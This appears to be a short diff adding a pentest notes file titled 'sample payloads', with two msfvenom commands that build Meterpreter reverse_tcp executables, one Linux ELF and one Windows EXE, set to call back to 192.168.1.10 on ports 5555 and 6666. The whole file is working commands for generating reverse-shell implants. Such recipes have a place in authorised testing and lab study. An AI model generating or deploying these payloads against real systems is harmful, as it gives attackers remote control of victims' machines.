@@ -1,0 +1,7 @@
+#sample payloads
+
+#linux
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=5555 -f elf -o meterpreter.elf
+
+#windows
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=6666 -f exe -o meterpreter.exe
